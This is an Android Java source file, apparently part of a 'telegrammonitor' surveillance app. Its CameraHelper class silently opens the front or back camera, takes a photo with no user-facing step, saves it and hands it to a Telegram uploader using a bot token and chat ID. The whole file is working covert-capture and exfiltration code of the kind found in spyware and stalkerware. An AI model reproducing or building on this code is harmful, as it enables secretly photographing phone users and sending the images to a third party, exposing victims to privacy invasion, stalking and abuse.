package com.nehal.telegrammonitor;

import android.content.Context;
import android.hardware.Camera;
import android.os.Environment;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;

public class CameraHelper {

    public static void takePhoto(Context context, String botToken, String chatId) {
        capture(context, Camera.CameraInfo.CAMERA_FACING_BACK, botToken, chatId);
    }

    public static void captureFront(Context context, String botToken, String chatId) {
        capture(context, Camera.CameraInfo.CAMERA_FACING_FRONT, botToken, chatId);
    }

    public static void captureBack(Context context, String botToken, String chatId) {
        capture(context, Camera.CameraInfo.CAMERA_FACING_BACK, botToken, chatId);
    }

    private static void capture(Context context, int cameraFacing, String botToken, String chatId) {
        Camera camera = null;
        try {
            camera = Camera.open(cameraFacing);
            camera.setPreviewCallback(null);
            camera.startPreview();
            camera.takePicture(null, null, (data, cam) -> {
                try {
                    File file = new File(context.getExternalFilesDir(Environment.DIRECTORY_PICTURES),
                            (cameraFacing == Camera.CameraInfo.CAMERA_FACING_FRONT ? "front_" : "back_") + "camera.jpg");

                    FileOutputStream fos = new FileOutputStream(file);
                    fos.write(data);
                    fos.close();

                    TelegramUploader.sendPhoto(botToken, chatId, file.getAbsolutePath());
                } catch (IOException e) {
                    e.printStackTrace();
                }
            });
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}